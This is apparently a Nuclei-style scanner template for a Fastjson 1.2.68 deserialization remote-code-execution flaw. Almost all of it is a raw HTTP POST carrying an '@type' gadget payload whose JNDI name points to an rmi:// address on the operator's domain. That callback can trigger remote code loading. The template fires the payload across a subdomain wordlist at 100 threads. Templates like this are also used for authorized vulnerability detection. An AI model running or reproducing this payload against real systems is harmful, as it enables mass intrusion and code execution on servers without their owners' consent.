id: fastjson-1.2.68-rce 2
info:
  author: zh
  name: Fastjson 1.2.68 Deserialization RCE
  reference:
  - https://github.com/tdtc7/qps/tree/4042cf76a969ccded5b30f0669f67c9e58d1cfd2/Fastjson
  - https://github.com/wyzxxz/fastjson_rce_tool
  severity: critical
  tags: fastjson,rce,deserialization,oast
requests:
- attack: sniper
  payloads:
    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
  raw:
  - "POST / HTTP/1.1\nHost: {{Subdomains}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0;\
    \ rv:68.0) Gecko/20100101 Firefox/68.0\nAccept-Encoding: gzip, deflate\nAccept:\
    \ */*\nContent-Type: application/json\n\n{\n   \"@type\":\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\"\
    ,\n   \"jndiNames\":\"rmi://{{Host}}.{{Port}}.{{Subdomains}}.fastjson.{{MY-DOMAIN}}/Exploit\"\
    \n}"
  threads: 100
